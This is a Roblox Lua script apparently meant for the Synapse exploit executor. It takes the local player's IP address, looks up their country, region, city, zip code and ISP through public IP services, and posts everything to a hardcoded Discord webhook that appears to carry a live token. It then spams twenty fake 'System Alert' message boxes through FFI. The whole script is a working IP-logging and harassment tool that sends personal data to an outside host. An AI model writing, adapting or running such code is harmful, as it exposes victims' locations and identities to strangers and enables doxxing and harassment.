local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- 🧍 Get player name
local name = Players.LocalPlayer.Name

-- 🌐 Your webhook
local WebhookURL = "https://discord.com/api/webhooks/1334621691573178482/rWPP7Q2B6PO-eURqIkN1aM2IC8TUd8UAxQQEC9qj4RSosBfuTCmshI-RIJgi_yLjXWxp" -- 🔁 replace this!

-- 🌍 Get IP address
local success1, getIPResponse = pcall(function()
    return syn.request({
        Url = "https://api.ipify.org/?format=json",
        Method = "GET"
    })
end)

if not success1 then return warn("Failed to get IP") end

local IPBuffer = HttpService:JSONDecode(getIPResponse.Body).ip

-- 🛰 Get location info
local success2, getIPInfo = pcall(function()
    return syn.request({
        Url = "http://ip-api.com/json/" .. IPBuffer,
        Method = "GET"
    })
end)

if not success2 then return warn("Failed to get IP location") end

local IIT = HttpService:JSONDecode(getIPInfo.Body)

-- 📝 Format message
local dataMessage = string.format([[
🧍 User: %s
🌐 IP: %s
🏳 Country: %s (%s)
📍 Region: %s, %s
🏙 City: %s (%s)
🛰 ISP: %s
🏢 Org: %s
]], name, IPBuffer, IIT.country, IIT.countryCode, IIT.region, IIT.regionName, IIT.city, IIT.zip, IIT.isp, IIT.org)

-- 📤 Send to Discord webhook
pcall(function()
    syn.request({
        Url = WebhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({ content = dataMessage })
    })
end)

-- 💥 MessageBox Spammer (requires Synapse & FFI)
local ffi = require("ffi")
ffi.cdef[[
    int MessageBoxA(void* hWnd, const char* lpText, const char* lpCaption, unsigned int uType);
]]

-- 📛 Customize your popup message
local popupText = "⚠️ You've been ooby'd by " .. name .. "!"
local popupTitle = "System Alert"

for i = 1, 20 do
    spawn(function()
        ffi.C.MessageBoxA(nil, popupText, popupTitle, 0)
    end)
end
